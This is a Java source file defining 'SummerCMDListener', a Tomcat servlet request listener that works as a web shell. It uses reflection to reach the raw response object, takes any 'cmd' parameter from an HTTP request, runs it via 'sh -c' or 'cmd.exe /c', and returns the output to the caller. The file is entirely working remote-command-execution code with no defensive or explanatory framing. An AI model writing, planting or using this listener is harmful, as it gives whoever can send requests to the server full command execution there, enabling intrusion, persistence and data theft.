package com.summer233;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;

public class SummerCMDListener implements ServletRequestListener {
    public SummerCMDListener() {
    }

    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade request = (RequestFacade) servletRequestEvent.getServletRequest();
            Field f = request.getClass().getDeclaredField("request");
            f.setAccessible(true);
            Request req = (Request) f.get(request);
            ServletResponse servletResponse = req.getResponse();
            servletResponse.setContentType("text/html; charset=UTF-8");
            servletResponse.setCharacterEncoding("UTF-8");
            servletResponse.getWriter().println("this is a SummerCMDListener<br>");

            HttpServletRequest httpReq = (HttpServletRequest) req;
            String cmd = httpReq.getParameter("cmd");
            if (cmd != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
                        : new String[] { "cmd.exe", "/c", cmd };
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                try (PrintWriter responseWriter = servletResponse.getWriter()) {
                    responseWriter.println(output);
                    responseWriter.flush();
                }
            }
        } catch (Exception var5) {
            var5.printStackTrace();
        }

    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
    }
}
